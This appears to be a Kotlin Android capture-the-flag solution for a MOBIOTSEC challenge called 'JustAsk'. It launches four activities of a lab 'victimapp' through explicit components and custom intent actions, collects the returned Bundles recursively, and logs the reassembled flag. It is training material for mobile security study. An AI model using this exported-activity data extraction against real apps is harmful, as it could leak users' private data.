package com.example.justask

import android.content.ComponentName
import android.content.Intent
import android.os.Bundle
import android.util.Log
import androidx.activity.ComponentActivity

class MainActivity : ComponentActivity() {

    private val TAG = "MOBIOTSEC"
    private val PART_ONE = 1
    private val PART_TWO = 2
    private val PART_THREE = 3
    private val PART_FOUR = 4

    private val flag = arrayOfNulls<String>(4)
    private var counter = 0

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        Log.i(TAG, "Entered main")

        try {
            // PartOne
            val intentPartOne = Intent()
            intentPartOne.component = ComponentName("com.example.victimapp", "com.example.victimapp.PartOne")
            startActivityForResult(intentPartOne, PART_ONE)
            Log.i(TAG, "Sent Part $PART_ONE")

            // PartTwo
            val intentPartTwo = Intent("com.example.victimapp.intent.action.JUSTASK")
            startActivityForResult(intentPartTwo, PART_TWO)
            Log.i(TAG, "Sent Part $PART_TWO")

            // PartThree
            val intentPartThree = Intent()
            intentPartThree.component = ComponentName("com.example.victimapp", "com.example.victimapp.PartThree")
            startActivityForResult(intentPartThree, PART_THREE)
            Log.i(TAG, "Sent Part $PART_THREE")

            // PartFour
            val intentPartFour = Intent("com.example.victimapp.intent.action.JUSTASKBUTNOTSOSIMPLE")
            startActivityForResult(intentPartFour, PART_FOUR)
            Log.i(TAG, "Sent Part $PART_FOUR")
        } catch (ex: Exception) {
            Log.e(TAG, ex.toString())
        }
    }

    private fun decryptBundle(intent: Intent): String {
        val flagPart = StringBuilder()

        fun extractFlagFromBundle(bundle: Bundle) {
            for (key in bundle.keySet()) {
                val value = bundle.get(key)
                if (value is Bundle) {
                    extractFlagFromBundle(value) // Recursively extract from nested Bundles
                } else {
                    flagPart.append("$key: $value\n")
                    if (key == "flag" && flagPart.contains("FLAG{")) {
                        // Stop if we found the complete flag
                        return
                    }
                }
            }
        }

        val extras = intent.extras
        if (extras != null) {
            extractFlagFromBundle(extras)
        }

        return flagPart.toString()
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        Log.i(TAG, "Got data from Part $requestCode")

        if (data != null) {
            val flagPart = decryptBundle(data)

            flag[requestCode - 1] = flagPart
            counter++

            Log.i(TAG, "Received Part $requestCode:\n$flagPart")

            if (counter == 4) {
                val completeFlag = flag.joinToString("")
                Log.i(TAG, "Complete Flag:\n$completeFlag")
            }
        } else {
            Log.e(TAG, "Received null data from Part $requestCode")
        }
    }
}
